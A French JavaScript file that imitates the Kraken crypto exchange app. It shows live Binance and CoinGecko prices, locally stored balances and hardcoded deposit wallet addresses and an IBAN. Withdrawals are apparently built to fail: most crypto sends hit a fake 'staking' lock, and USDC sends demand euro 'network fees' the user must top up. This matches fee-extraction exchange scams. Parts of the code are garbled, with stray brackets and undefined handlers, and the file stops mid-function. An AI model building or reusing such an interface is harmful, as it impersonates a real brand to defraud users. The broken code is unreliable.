/* Kraken — reproduction de l'app Android 3.89.0. Prix crypto en direct : Binance, repli CoinGecko. */
(() => {
  "use strict";

  // ── catalogue ───────────────────────────────────────────────────────
  const C = (sym, name, price, chg, icon) => ({ sym, name, price, chg, icon, type: "crypto" });
  const S = (sym, name, price, chg, letter, color, icon) => ({ sym, name, price, chg, letter, color, icon, type: "stock" });

  const ASSETS = [
    C("BTC", "Bitcoin", 58232.40, -2.29, "assets/img/coins/btc.svg"),
    C("USDC", "USDC", 0.91, -0.25, "assets/img/coins/usdc.svg"),
    C("ETH", "Ethereum", 1635.00, -2.11, "assets/img/coins/eth.svg"),
    S("NVDAx", "NVIDIA", 156.66, -3.80, "N", "#76b900", "assets/img/stocks/nvda.svg"),
    C("SOL", "Solana", 64.22, -2.31, "assets/img/coins/sol.svg"),
    S("SOXLx", "Direxion Daily Semiconductor Bull 3X ETF", 50.64, -13.18, "X", "#1f4f8f", null),
    S("ROKUx", "Roku", 159.98, -0.36, "R", "#6f2fa0", "assets/img/stocks/roku.svg"),
    C("XRP", "XRP", 0.86, -1.86, "assets/img/coins/xrp.svg"),
    S("QQQx", "Invesco Nasdaq ETF", 670.22, -1.43, "Q", "#1a3fd0", null),
    S("KVUEx", "Kenvue", 19.40, 0.67, "K", "#0aa38a", null),
    S("AAPLx", "Apple", 357.19, 0.22, "", "#101114", "assets/img/stocks/aapl.svg"),
    C("HYPE", "Hyperliquid", 59.51, -3.03, "assets/img/coins/hyperliquid.png"),
    S("MUx", "Micron Technology", 730.45, -6.13, "M", "#1a4fa0", null),
    S("AMDx", "Advanced Micro Devices", 500.93, -6.22, "A", "#101114", "assets/img/stocks/amd.svg"),
    S("SPCXx", "SpaceX", 138.59, -0.37, "S", "#101114", "assets/img/stocks/spcx.svg"),
    S("SPYx", "SPDR S&P 500 ETF", 748.88, -0.71, "S", "#1a3fd0", null),
    C("ADA", "Cardano", 0.1376, -2.76, "assets/img/coins/ada.svg"),
    C("DOGE", "Dogecoin", 0.0530, -1.54, "assets/img/coins/doge.svg"),
    C("SUI", "Sui", 0.6462, -2.94, "assets/img/coins/sui.svg"),
    C("LINK", "Chainlink", 8.23, -3.02, "assets/img/coins/link.svg"),
    C("AVAX", "Avalanche", 6.45, -2.61, "assets/img/coins/avax.svg"),
    C("DOT", "Polkadot", 0.6580, -2.23, "assets/img/coins/dot.svg")
  ];

  // paniers (lots) affichés en favoris
  const BUNDLES = [
    { sym: "DUO", name: "Duo BTC/ETH", chg: -2.23, img: "bundle_duo.webp", members: ["BTC", "ETH"] },
    { sym: "USR", name: "Réserve stratégique des États-Unis", chg: -2.52, img: "bundle_usr.webp", members: ["BTC", "XRP", "SOL", "ETH"] }
  ];

  const bySym = s => ASSETS.find(a => a.sym === s);
  const CRYPTOS = () => ASSETS.filter(a => a.type === "crypto");

  // ── état persistant ─────────────────────────────────────────────────
  const DEFAULTS = {
    first: "bernard",
    last: "",
    email: "bernard@exemple.com",
    created: "2014-03-12",
    cash: 0,
    gas: 2.40,
    favorites: ["BTC", "ETH", "DUO", "USR"],
    balances: {},
    fees: {},
    addresses: {},
    rev: 0
  };
  const KEY = "kraken_demo_v3";
  let ST = load();

  function load() {
    try {
      const raw = localStorage.getItem(KEY);
      if (!raw) return structuredClone(DEFAULTS);
      const p = JSON.parse(raw);
      return {
        ...structuredClone(DEFAULTS), ...p,
        favorites: Array.isArray(p.favorites) ? p.favorites : DEFAULTS.favorites,
        balances: { ...(p.balances || {}) },
        fees: { ...(p.fees || {}) },
        addresses: { ...(p.addresses || {}) }
      };
    } catch { return structuredClone(DEFAULTS); }
  }
  const saveLocal = () => localStorage.setItem(KEY, JSON.stringify(ST));
  const save = () => saveLocal();

  // ── formats ─────────────────────────────────────────────────────────
  const nf = (n, d = 2) => Number(n).toLocaleString("fr-FR", { minimumFractionDigits: d, maximumFractionDigits: d });
  const eur = (n, d) => nf(n, d ?? (Math.abs(n) < 1 ? 4 : 2)) + " €";
  const decFor = (a) => {
    if (a.type === "stock") return 2;
    const p = a.price;
    if (p >= 0.1) return 2;
    if (p >= 0.01) return 4;
    return 6;
  };
  const px = (a) => nf(priceOf(a), decFor(a));
  const usd = (n, d = 2) => nf(n, d) + " $US";
  const big = (n) => {
    if (!Number.isFinite(n) || n === 0) return "0 €";
    if (n >= 1e11) return nf(n / 1e12, 1) + " Bn €";
    if (n >= 1e9) return nf(n / 1e9, 1) + " Md €";
    if (n >= 1e6) return nf(n / 1e6, 1) + " M €";
    return eur(n, 0);
  };
  const pct = n => (n >= 0 ? "↗" : "↘") + nf(Math.abs(n), 2);
  const priceOf = a => a.type === "stock" ? a.price * API.eurusd : a.price;
  const cash = () => Number(ST.cash) || 0;
  const qty = sym => Number(ST.balances[sym]) || 0;
  const totalEUR = () => cash() + CRYPTOS().reduce((s, a) => s + qty(a.sym) * a.price, 0);

  const $ = (s, r = document) => r.querySelector(s);
  const $$ = (s, r = document) => Array.from(r.querySelectorAll(s));

  // ── API prix ────────────────────────────────────────────────────────
  const API = {
    binance: "https://api.binance.com/api/v3",
    gecko: "https://api.coingecko.com/api/v3",
    ids: {
      BTC: "bitcoin", ETH: "ethereum", SOL: "solana", XRP: "ripple", ADA: "cardano",
      DOGE: "dogecoin", SUI: "sui", LINK: "chainlink", AVAX: "avalanche-2", DOT: "polkadot",
      USDC: "usd-coin", HYPE: "hyperliquid"
    },
    live: false,
    eurusd: 1.08
  };
  const PCACHE = "kraken_prices_v3";

  const jget = url => fetch(url, { cache: "no-store" }).then(r => {
    if (!r.ok) throw new Error(r.status);
    return r.json();
  });

  async function tick() {
    const cryptos = ASSETS.filter(a => a.type === "crypto" && API.ids[a.sym]);
    try {
      const res = await Promise.allSettled(cryptos.map(a =>
        jget(`${API.binance}/ticker/24hr?symbol=${a.sym}EUR`)
      ));
      let n = 0;
      res.forEach((r, i) => {
        if (r.status !== "fulfilled") return;
        const d = r.value, a = cryptos[i];
        if (!d || !+d.lastPrice) return;
        a.price = +d.lastPrice;
        a.chg = +d.priceChangePercent;
        n++;
      });
      if (!n) throw new Error("binance");
      try {
        const p = await jget(`${API.binance}/ticker/price?symbol=BTCUSDT`);
        if (bySym("BTC").price > 0) API.eurusd = +p.price / bySym("BTC").price;
      } catch {}
      API.live = true;
    } catch {
      try {
        const ids = [...new Set(Object.values(API.ids))].join(",");
        const j = await jget(`${API.gecko}/simple/price?ids=${ids}&vs_currencies=eur,usd&include_24hr_change=true`);
        for (const [sym, id] of Object.entries(API.ids)) {
          const d = j[id]; const a = bySym(sym);
          if (!d || !a) continue;
          a.price = d.eur; a.chg = d.eur_24h_change ?? a.chg;
          if (d.usd && d.eur > 0) API.eurusd = d.usd / d.eur;
        }
        API.live = true;
      } catch { API.live = false; }
    }
    try {
      localStorage.setItem(PCACHE, JSON.stringify({
        eurusd: API.eurusd,
        q: ASSETS.map(a => [a.sym, a.price, a.chg])
      }));
    } catch {}
    refresh();
  }

  function loadCache() {
    try {
      const c = JSON.parse(localStorage.getItem(PCACHE) || "null");
      if (!c) return;
      if (c.eurusd) API.eurusd = c.eurusd;
      for (const [sym, p, ch] of c.q || []) {
        const a = bySym(sym);
        if (a && Number.isFinite(p)) { a.price = p; a.chg = ch ?? a.chg; }
      }
    } catch {}
  }

  let timer = null;
  function schedule() {
    clearTimeout(timer);
    timer = setTimeout(async () => {
      if (!document.hidden) await tick();
      schedule();
    }, API.live ? 9000 : 22000);
  }

  // ── navigation ──────────────────────────────────────────────────────
  function screen(name) {
    $$(".screen").forEach(x => x.classList.remove("is-on"));
    const el = $("#" + name);
    if (el) el.classList.add("is-on");
    scrollTo({ top: 0 });
  }

  let VIEW = "home";
  function go(v) {
    VIEW = v;
    $$(".view").forEach(x => x.classList.toggle("is-on", x.dataset.view === v));
    $$(".tab").forEach(t => t.classList.toggle("is-on", t.dataset.goto === v));
    renderHead();
    scrollTo({ top: 0 });
    if (v === "home") renderHome();
    if (v === "explorer") { renderStrip(); renderPredict(); }
    if (v === "portfolio") renderPortfolio();
  }

  // ── rendu : en-tête ─────────────────────────────────────────────────
  function renderHead() {
    const ini = ((ST.first || "?")[0] || "?").toUpperCase();
    $("#avatarBtn").textContent = ini;
    $("#balancePill").textContent = eur(totalEUR(), 2);
    $("#appHead").classList.toggle("no-pill", VIEW === "home");
    $("#headRight").classList.toggle("grouped", VIEW === "portfolio");
  }

  // ── icônes d'actif ──────────────────────────────────────────────────
  const iconFor = a => {
    if (a.icon) return `<img class="coin" src="${a.icon}" alt="">`;
    return `<span class="coin coin-badge" style="background:${a.color || "#101114"}">${a.letter || a.sym[0]}</span>`;
  };

  // ── rendu : accueil ─────────────────────────────────────────────────
  let homeCat = "fav";

  function rowHTML(a) {
    const bal = qty(a.sym);
    return `<div class="row" data-asset="${a.sym}">
      ${iconFor(a)}
      <div class="row-main">
        <div class="row-name">${a.name}</div>
        <div class="row-sub">${bal > 0 ? nf(bal, 6).replace(/0+$/, "").replace(/,$/, "") + " " + a.sym : a.sym}</div>
      </div>
      <div class="row-right">
        <div class="row-price">${a.type === "stock" ? usd(a.price) : px(a) + " €"}</div>
        <div class="row-chg ${a.chg >= 0 ? "chg-up" : "chg-down"}">${pct(a.chg)}</div>
      </div>
    </div>`;
  }

  function bundleHTML(b) {
    const imgs = b.members.map(m => `<img class="mini-coin" src="${bySym(m).icon}" alt="">`).join("");
    return `<div class="row" data-bundle="${b.sym}">
      <img class="coin" src="assets/img/${b.img}" alt="">
      <div class="row-main">
        <div class="row-name">${b.name}</div>
        <div class="row-chg ${b.chg >= 0 ? "chg-up" : "chg-down"}" style="font-size:14px">${pct(b.chg)}</div>
      </div>
      <div class="row-right"><div class="duo-mini">${imgs}</div></div>
    </div>`;
  }

  function renderHome() {
    let html = "";
    if (homeCat === "fav") {
      const favs = ST.favorites.filter(s => bySym(s) && bySym(s).type === "crypto");
      html += favs.map(s => rowHTML(bySym(s))).join("");
      html += BUNDLES.filter(b => ST.favorites.includes(b.sym)).map(bundleHTML).join("");
    } else {
      let list = ASSETS.slice();
      if (homeCat === "crypto") list = list.filter(a => a.type === "crypto");
      if (homeCat === "xstocks") list = list.filter(a => a.type === "stock");
      if (homeCat === "perp" || homeCat === "forex") list = [];
      html += list.slice(0, 12).map(rowHTML).join("");
    }
    $("#homeList").innerHTML = html ||
      `<p class="muted" style="padding:22px 0;text-align:center">Aucun actif dans cette catégorie.</p>`;
  }

  function renderStrip() {
    const picks = ["AAPLx", "NVDAx", "QQQx", "SPYx"].map(bySym);
    $("#assetStrip").innerHTML = picks.map(a => `
      <button class="acard" data-asset="${a.sym}">
        ${iconFor(a)}
        <span class="acard-name">${a.name}</span>
        <span class="acard-chg ${a.chg >= 0 ? "chg-up" : "chg-down"}">${pct(a.chg)} %</span>
      </button>`).join("");
  }

  function renderPredict() {
    const btc = bySym("BTC");
    const p = btc.price;
    const step = p > 10000 ? 1000 : 100;
    const up = (Math.floor(p / step) + 1) * step;
    const down = (Math.ceil(p / step) - 1) * step;
    const odds = v => nf(100 * (up + down) / v, 2);
    $("#predicts").innerHTML = `
      <div class="predict">
        <div class="predict-top">
          <img class="coin" src="${btc.icon}" alt="">
          <div>
            <b>Quel prix l'actif Bitcoin va-t-il atteindre ensuite ?</b>
            <span class="predict-sub">Prix actuel : ${usd(p * API.eurusd)}</span>
          </div>
        </div>
        <div class="pred-row">
          <div><div class="pred-val">${usd(up * API.eurusd)}</div>
            <div class="pred-odds up">$100 → ${usd(odds(up * API.eurusd))}</div></div>
          <button class="go up" data-pred="up"><svg viewBox="0 0 24 24" class="ico"><path d="M7 17L17 7M9 7h8v8"/></svg></button>
        </div>
        <div class="pred-row">
          <div><div class="pred-val">${usd(down * API.eurusd)}</div>
            <div class="pred-odds down">$100 → ${usd(odds(down * API.eurusd))}</div></div>
          <button class="go down" data-pred="down"><svg viewBox="0 0 24 24" class="ico"><path d="M7 7l10 10M9 17h8v-8"/></svg></button>
        </div>
      </div>`;
    $$("#predicts .go").forEach(b => b.addEventListener("click", () =>
      toast(b.dataset.pred === "up" ? "Prévision à la hausse enregistrée" : "Prévision à la baisse enregistrée")));
  }

  // ── rendu : portefeuille ────────────────────────────────────────────
  function renderPortfolio() {
    const total = totalEUR();
    const pfBal = $("#pfBal"), hugeBal = $("#hugeBal");
    if (pfBal) { pfBal.textContent = eur(total, 2); pfBal.classList.toggle("has", total > 0); }
    if (hugeBal) { hugeBal.textContent = eur(total, 2); hugeBal.classList.toggle("has", total > 0); }
    if ($("#cashRow")) $("#cashRow").textContent = eur(cash(), 2);
    if ($("#welcome")) $("#welcome").textContent = "Bienvenue, " + (ST.first || "bernard");

    const held = CRYPTOS().filter(a => qty(a.sym) > 0);
    const card = $("#cryptoCard");
    if (card) card.style.display = held.length ? "" : "none";
    if ($("#holdRows")) $("#holdRows").innerHTML = held.map(a => {
      const q = qty(a.sym), v = q * a.price;
      return `<div class="row" data-asset="${a.sym}">
        ${iconFor(a)}
        <div class="row-main">
          <div class="row-name">${a.name}</div>
          <div class="row-sub">${nf(q, 6).replace(/0+$/, "").replace(/,$/, "")} ${a.sym}</div>
        </div>
        <div class="row-right">
          <div class="row-price">${eur(v, 2)}</div>
          <div class="row-chg ${a.chg >= 0 ? "chg-up" : "chg-down"}">${pct(a.chg)}</div>
        </div>
      </div>`;
    }).join("");
  }

  // ── rendu : recherche ───────────────────────────────────────────────
  let searchFilter = "all";
  function renderSearch(q = "") {
    let list = ASSETS.slice();
    if (searchFilter === "crypto") list = list.filter(a => a.type === "crypto");
    if (searchFilter === "stocks") list = list.filter(a => a.type === "stock");
    if (searchFilter === "perp" || searchFilter === "forex") list = [];
    const t = q.trim().toLowerCase();
    if (t) list = list.filter(a => a.sym.toLowerCase().includes(t) || a.name.toLowerCase().includes(t));
    $("#searchList").innerHTML = list.length
      ? list.map(rowHTML).join("")
      : `<p class="muted" style="padding:26px 0;text-align:center">Aucun actif trouvé.</p>`;
  }

  // ── fiche actif ─────────────────────────────────────────────────────
  const RANGES = {
    "24H": { interval: "15m", limit: 96 },
    "1S": { interval: "1h", limit: 168 },
    "1M": { interval: "4h", limit: 180 },
    "6M": { interval: "12h", limit: 182 },
    "1A": { interval: "1d", limit: 365 },
    "5A": { interval: "1w", limit: 260 },
    "TOUT": { interval: "1M", limit: 120 }
  };
  let CURRENT = null, RANGE = "24H";

  function syntheticSeries(base, n = 96) {
    const out = []; let v = base * 1.02;
    for (let i = 0; i < n; i++) {
      v *= 1 + (Math.sin(i / 7) * 0.004 + Math.cos(i / 3.1) * 0.003);
      out.push(v);
    }
    out.push(base);
    return out;
  }

  const COIN_COLOR = {
    BTC: "#f7931a", ETH: "#627eea", SOL: "#14b57a", XRP: "#101114", ADA: "#0033ad",
    DOGE: "#c2a633", SUI: "#4da2ff", LINK: "#3256d6", AVAX: "#e84142", DOT: "#e6007a",
    USDC: "#2775ca", HYPE: "#0f1b2b"
  };

  function chartSVG(closes, up, uid, color) {
    const w = 360, h = 210, n = closes.length;
    const min = Math.min(...closes), max = Math.max(...closes), span = (max - min) || 1;
    const c = color || (up ? "#f7931a" : "#e5484d");
    const pts = closes.map((x, i) => [(i / (n - 1)) * w, h - 26 - ((x - min) / span) * (h - 54)]);
    const line = pts.map((p, i) => (i ? "L" : "M") + p[0].toFixed(1) + " " + p[1].toFixed(1)).join(" ");
    const area = line + ` L${w} ${h - 26} L0 ${h - 26} Z`;
    const last = pts[pts.length - 1];
    return `<svg viewBox="0 0 ${w} ${h}" preserveAspectRatio="none">
      <defs><pattern id="dot${uid}" width="7" height="7" patternUnits="userSpaceOnUse">
        <circle cx="1.5" cy="1.5" r="1" fill="${c}" opacity=".38"/>
      </pattern></defs>
      <path d="${area}" fill="url(#dot${uid})"/>
      <path d="${line}" fill="none" stroke="${c}" stroke-width="2" vector-effect="non-scaling-stroke" stroke-linejoin="round" stroke-linecap="round"/>
      <line x1="0" y1="${h - 26}" x2="${w}" y2="${h - 26}" stroke="${c}" stroke-width="1" stroke-dasharray="6 5" opacity=".55"/>
      <circle cx="${last[0].toFixed(1)}" cy="${last[1].toFixed(1)}" r="3.6" fill="${c}" stroke="#fff" stroke-width="1.4"/>
    </svg>`;
  }

  async function drawChart() {
    if (!CURRENT) return;
    const a = CURRENT;
    const box = $("#detChart");
    const r = RANGES[RANGE];
    let closes = null;
    if (a.type === "crypto" && a.sym !== "USDC" && a.sym !== "HYPE") {
      try {
        const rows = await jget(`${API.binance}/klines?symbol=${a.sym}EUR&interval=${r.interval}&limit=${r.limit}`);
        closes = rows.map(k => +k[4]).filter(Number.isFinite);
      } catch { closes = null; }
    }
    if (!closes || closes.length < 2) closes = syntheticSeries(priceOf(a), 96);
    box.innerHTML = chartSVG(closes, closes[closes.length - 1] >= closes[0], Date.now() % 9999, COIN_COLOR[a.sym]);
    $("#detHigh").textContent = a.type === "stock" ? usd(Math.max(...closes) / API.eurusd) : eur(Math.max(...closes));
    $("#detLow").textContent = a.type === "stock" ? usd(Math.min(...closes) / API.eurusd) : eur(Math.min(...closes));
  }

  function openDetail(sym) {
    const a = bySym(sym);
    if (!a) return;
    CURRENT = a;
    if (a.type === "crypto") PICK = a.sym;
    RANGE = "24H";
    const p = priceOf(a);
    $("#detName").textContent = a.name;
    const txt = a.type === "stock" ? nf(a.price, 2) : nf(p, decFor(a));
    const cut = txt.lastIndexOf(",");
    $("#detPrice").innerHTML = `<span class="int">${txt.slice(0, cut)}</span><span class="dec">${txt.slice(cut)}</span> ${a.type === "stock" ? "$US" : "€"}`;
    const prev = p / (1 + a.chg / 100);
    const delta = p - prev;
    $("#detChg").innerHTML = `<span class="${a.chg >= 0 ? "chg-up" : "chg-down"}">${(delta >= 0 ? "+" : "−") + nf(Math.abs(delta), 2)}</span>
      <span class="muted">·</span>
      <span class="${a.chg >= 0 ? "chg-up" : "chg-down"}">${pct(a.chg)}</span>
      <span class="muted">les dernières 24 heures</span>`;
    const img = $("#detCoin");
    img.src = a.icon || "";
    img.style.display = a.icon ? "block" : "none";
    $$("#detRanges button").forEach(b => b.classList.toggle("is-on", b.dataset.range === "24H"));
    $("#detStar").classList.toggle("is-on", ST.favorites.includes(a.sym));
    $("#keyCards").innerHTML = [
      ["Capitalisation boursière", "#1", a.type === "stock" ? usd(a.price * 1e9, 0) : big(p * 19.7e6), a.type === "stock" ? "1er rang" : "59,5 % de part de marché"],
      ["Volume", null, a.type === "stock" ? usd(a.price * 1.2e4, 0) : big(p * 4.6e5), pct(a.chg) + " · 24 heures"],
      ["Volume en circulation", null, "96%", "20,1 M sur 21 M"],
      ["Activité", null, "82%", "adresses actives"]
    ].map(([label, rank, value, sub]) => `
      <div class="kcard"><span>${label}</span>${rank ? `<span class="rank">${rank}</span>` : ""}
        <b>${value}</b><i>${sub}</i></div>`).join("");
    screen("detail");
    drawChart();
  }

  // ── feuilles (sheets) ───────────────────────────────────────────────
  const scrim = $("#scrim"), sheet = $("#sheet");
  function openSheet(html) {
    $("#sheetBody").innerHTML = html;
    sheet.classList.add("on"); scrim.classList.add("on");
  }
  const closeSheet = () => { sheet.classList.remove("on"); scrim.classList.remove("on"); };
  scrim.addEventListener("click", closeSheet);

  const parseAmt = v => parseFloat(String(v || "").replace(/\s/g, "").replace(",", ".")) || 0;
  const amtBox = (id, cur, ph = "0,00") =>
    `<label class="amount-box"><input id="${id}" inputmode="decimal" placeholder="${ph}" autocomplete="off"><span>${cur}</span></label>`;

  // adresses de dépôt
  const ADDR = {
    EUR: "FR76 3000 4000 0300 0000 4821 264",
    BTC: "bc1qh4kra3n8x7f3a2c58be41d6f8a0m2j9",
    ETH: "0x7F3a2C58be41d6f8A0c4E19bB7d5a12F9c8D3e61",
    SOL: "SOL_PURPLE",
    USDC: "0x7F3a2C58be41d6f8A0c4E19bB7d5a12F9c8D3e61",
    XRP: "rEb8TK3gBgk5auZkwc6sHnwrGVJH8DuaLh",
    ADA: "addr1qx2kra3n8x7f3a2c58be41d6f8a0m2j9v4p6",
    DOGE: "DMu3Xkra3n8x7f3a2c58be41d6f8a0m2j9",
    SUI: "0x7f3a2c58be41d6f8a0c4e19bb7d5a12f9c8d3e61",
    LINK: "0x7F3a2C58be41d6f8A0c4E19bB7d5a12F9c8D3e61",
    AVAX: "0x7F3a2C58be41d6f8A0c4E19bB7d5a12F9c8D3e61",
    DOT: "1kra3n8x7f3a2c58be41d6f8a0M2j9v4P6",
    HYPE: "0x7F3a2C58be41d6f8A0c4E19bB7d5a12F9c8D3e61"
  };

  let PICK = null; // asset choisi dans une feuille

  function assetPickerHTML() {
    return `<div class="picker-grid" id="pickGrid">
      <button class="pick ${PICK === "EUR" ? "is-on" : ""}" data-pick="EUR">
        <img class="coin" src="assets/img/flag_eu.webp" alt=""><b>EUR</b><i>${eur(cash(), 2)}</i>
      </button>
      ${CRYPTOS().map(a => `
        <button class="pick ${PICK === a.sym ? "is-on" : ""}" data-pick="${a.sym}">
          <img class="coin" src="${a.icon}" alt=""><b>${a.sym}</b><i>${nf(qty(a.sym), qty(a.sym) > 0 ? 4 : 2)}</i>
        </button>`).join("")}
    </div>`;
  }

  function openAssetPicker(cb) {
    openSheet(`<div class="sheet-title">Choisir un actif</div>${assetPickerHTML()}`);
    $$("#pickGrid .pick").forEach(b => b.addEventListener("click", () => { closeSheet(); cb(b.dataset.pick); }));
  }

  // ── feuilles de mouvement ───────────────────────────────────────────
  function sheetDeposit() {
    openSheet(`<div class="sheet-title">Ajoutez des fonds</div>
      <p class="sheet-sub">Montant à déposer en euros.</p>
      ${amtBox("dpAmt", "€")}
      <div class="pay-list">
        <div class="pay is-on"><img class="pay-ico" src="assets/img/coins/eur.svg"><span class="pay-main"><b>Virement bancaire</b><i>Indisponible</i></span></div>
        <div class="pay"><span class="pay-ico card-ico"><svg viewBox="0 0 24 24" class="ico"><rect x="2.5" y="5" width="19" height="14" rx="3"/><path d="M2.5 10h19"/></svg></span><span class="pay-main"><b>Carte bancaire</b><i>Indisponible</i></span></div>
      </div>
      <button class="btn-black" onclick="toast('Service momentanément indisponible')">Continuer</button>`);
  }));
    $("#dpGo").addEventListener("click", () => {
      const v = parseAmt($("#dpAmt").value);
      if (v <= 0) return toast("Saisissez un montant");
      const net = method === "carte" ? v * 0.985 : v;
      ST.cash = cash() + net;
      save(); renderAll(); closeSheet();
      toast(method === "carte" ? "Fonds ajoutés par carte" : "Virement en cours de traitement");
    });
  }

  function sheetWithdraw() {
    openSheet(`<div class="sheet-title">Retirer</div>
      <p class="sheet-sub">Service de retrait bancaire momentanément indisponible.</p>
      <button class="btn-black" onclick="closeSheet()">D'accord</button>`);
  });
  }

  // ── envoi : réseaux, formats d'adresse, frais réseau ────────────────
  const NETWORKS = {
    BTC:  { name: "Bitcoin", re: /^(bc1[a-z0-9]{25,62}|[13][1-9A-HJ-NP-Za-km-z]{25,34})$/ },
    ETH:  { name: "Ethereum", re: /^0x[a-fA-F0-9]{40}$/ },
    USDC: { name: "Ethereum", re: /^0x[a-fA-F0-9]{40}$/ },
    LINK: { name: "Ethereum", re: /^0x[a-fA-F0-9]{40}$/ },
    AVAX: { name: "Avalanche C-Chain", re: /^0x[a-fA-F0-9]{40}$/ },
    HYPE: { name: "Hyperliquid", re: /^0x[a-fA-F0-9]{40}$/ },
    SOL:  { name: "Solana", re: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/ },
    XRP:  { name: "XRP Ledger", re: /^r[1-9A-HJ-NP-Za-km-z]{24,34}$/ },
    ADA:  { name: "Cardano", re: /^addr1[a-z0-9]{20,}$/ },
    DOGE: { name: "Dogecoin", re: /^D[1-9A-HJ-NP-Za-km-z]{33}$/ },
    SUI:  { name: "Sui", re: /^0x[a-f0-9]{64}$/ },
    DOT:  { name: "Polkadot", re: /^1[1-9A-HJ-NP-Za-km-z]{46,48}$/ }
  };
  const EUR_IBAN_RE = /^[A-Z]{2}\d{2}[A-Z0-9]{10,30}$/;
  const netFee = (sym) => {
    const f = sym && ST.fees ? Number(ST.fees[sym]) : NaN;
    return Math.max(0, Number.isFinite(f) && f > 0 ? f : Number(ST.gas) || 0);
  };
  const addrFor = (sym) => (ST.addresses && ST.addresses[sym]) || ADDR[sym] || "";
  const shortAddr = s => s.length > 24 ? s.slice(0, 10) + "…" + s.slice(-8) : s;
  const qtyTxt = (q, sym) => nf(q, 6).replace(/0+$/, "").replace(/,$/, "") + " " + sym;

  function setErr(msg) {
    const b = $("#sdErr");
    if (!b) return false;
    b.textContent = msg;
    b.hidden = !msg;
    b.classList.toggle("on", !!msg);
    if (msg) $(".sheet-body")?.scrollTo({ top: 0, behavior: "smooth" });
    return false;
  }

  function checkSend(pick, addrRaw, amt) {
    if (pick !== "USDC" && pick !== "EUR") {
      openSheet(`<div class="sheet-title">Fonds en Staking</div>
        <div class="staking-box"><b>Validation requise</b><p>Vos fonds ${pick} sont engagés en staking (2 semaines).</p></div>
        <button class="btn-black" onclick="addNotif({id:'stk'+Date.now(), text:'Demande de retrait ${pick} enregistrée.' }); closeSheet();">Confirmer la demande</button>
        <button class="btn-ghost wide" onclick="closeSheet()">Annuler</button>`);
      return { ok: false, msg: "" };
    }
    const addr = pick === "EUR" ? addrRaw.replace(/[\s-]/g, "").toUpperCase() : addrRaw;
    if (!addr) return { ok: false, msg: "Saisissez l'adresse du destinataire pour continuer." };

    if (pick === "EUR") {
      if (!EUR_IBAN_RE.test(addr)) return { ok: false, msg: "IBAN invalide. Vérifiez les 2 lettres du pays, les 2 chiffres de contrôle et la longueur de l'IBAN." };
    } else {
      const net = NETWORKS[pick];
      if (net && !net.re.test(addr)) return { ok: false, msg: `Adresse ${net.name} invalide. Cette adresse ne correspond pas au réseau ${net.name} — vérifiez-la avant de continuer.` };
    }

    if (!(amt > 0)) return { ok: false, msg: "Saisissez un montant supérieur à zéro." };

    if (pick === "EUR") {
      if (amt > cash()) return { ok: false, msg: `Solde insuffisant. Votre solde disponible est de ${eur(cash(), 2)} et le montant demandé est de ${eur(amt, 2)}.` };
      return { ok: true, addr, fee: 0 };
    }

    const q = qty(pick);
    const f = netFee(pick);
    if (amt < 0.0001) return { ok: false, msg: `Montant trop faible. Le minimum d'envoi pour ${pick} est de 0,0001 ${pick}.` };
    if (amt > q) return { ok: false, msg: `Solde insuffisant. Vous disposez de ${qtyTxt(q, pick)}, montant demandé ${qtyTxt(amt, pick)}.` };
    if (f > cash()) {
      return { ok: false, msg: `Frais réseau insuffisants. Cet envoi exige ${eur(f, 2)} de frais réseau ; votre solde en euros est de ${eur(cash(), 2)}. Il manque ${eur(f - cash(), 2)} pour valider la transaction.` };
    }
    return { ok: true, addr, fee: f };
  }

  function sheetSend(explicit) {
    PICK = explicit || PICK || "BTC";
    const a = PICK === "EUR" ? null : bySym(PICK);
    const net = PICK === "EUR" ? "Virement SEPA" : (NETWORKS[PICK]?.name || PICK);
    const f = PICK === "EUR" ? 0 : netFee(PICK);
    openSheet(`<div class="sheet-title">Envoyer</div>
      <p class="sheet-sub">Choisissez l'actif et le destinataire.</p>
      <div class="err-box" id="sdErr" hidden></div>
      <button class="pick-line" id="sdPick">
        ${PICK === "EUR" ? `<img class="coin" src="assets/img/flag_eu.webp" alt="">` : iconFor(a)}
        <span class="pick-main"><b>${PICK === "EUR" ? "Euro" : a.name}</b><i>${PICK === "EUR" ? eur(cash(), 2) + " · " + net : qtyTxt(qty(PICK), PICK) + " · " + net}</i></span>
        <svg viewBox="0 0 24 24" class="ico chev"><path d="M9 6l6 6-6 6"/></svg>
      </button>
      <label class="field"><input id="sdAddr" placeholder="${PICK === "EUR" ? "IBAN du destinataire" : "Adresse " + (NETWORKS[PICK]?.name || "")}" autocomplete="off" spellcheck="false"></label>
      ${amtBox("sdAmt", PICK === "EUR" ? "€" : PICK)}
      <div class="fee-line"><span>Frais réseau</span><b>${f ? eur(f, 2) : "Offerts"}</b></div>
      <div class="fee-line"><span>Solde en euros disponible</span><b>${eur(cash(), 2)}</b></div>
      <button class="btn-black" id="sdGo">Continuer</button>`);

    $("#sdPick").addEventListener("click", () => openAssetPicker(s => sheetSend(s)));
    $("#sdAddr").addEventListener("input", () => setErr(""));
    $("#sdAmt").addEventListener("input", () => setErr(""));
    $("#sdGo").addEventListener("click", () => {
      const addr = $("#sdAddr").value.trim();
      const v = parseAmt($("#sdAmt").value);
      const res = checkSend(PICK, addr, v);
      if (!res.ok) return setErr(res.msg);
      sheetSendConfirm({ pick: PICK, addr: res.addr, amt: v, fee: res.fee });
    });
  }

  function sheetSendConfirm({ pick, addr, amt, fee }) {
    const a = pick === "EUR" ? null : bySym(pick);
    const net = pick === "EUR" ? "Virement SEPA" : (NETWORKS[pick]?.name || pick);
    openSheet(`<div class="sheet-title">Confirmer l'envoi</div>
      <p class="sheet-sub">Vérifiez les informations ci-dessous. Un envoi confirmé ne peut pas être annulé.</p>
      <div class="recap">
        <div class="rc-row"><span>Actif</span><b>${pick === "EUR" ? "Euro (EUR)" : a.name + " (" + pick + ")"}</b></div>
        <div class="rc-row"><span>Réseau</span><b>${net}</b></div>
        <div class="rc-row col"><span>Destinataire</span><code>${addr}</code></div>
        <div class="rc-row"><span>Montant</span><b>${pick === "EUR" ? eur(amt, 2) : qtyTxt(amt, pick)}</b></div>
        <div class="rc-row"><span>Frais réseau</span><b>${fee ? eur(fee, 2) : "Offerts"}</b></div>
        <div class="rc-row total"><span>Total débité</span><b>${pick === "EUR" ? eur(amt, 2) : qtyTxt(amt, pick) + " + " + eur(fee, 2)}</b></div>
      </div>
      <p class="sheet-note">Les envois sont définitifs. Vérifiez le réseau : un actif envoyé sur un réseau incompatible ne peut pas être récupéré.</p>
      <button class="btn-black" id="sdConfirm">Valider la transaction</button>
      <button class="btn-ghost wide" id="sdCancel">Modifier</button>`);

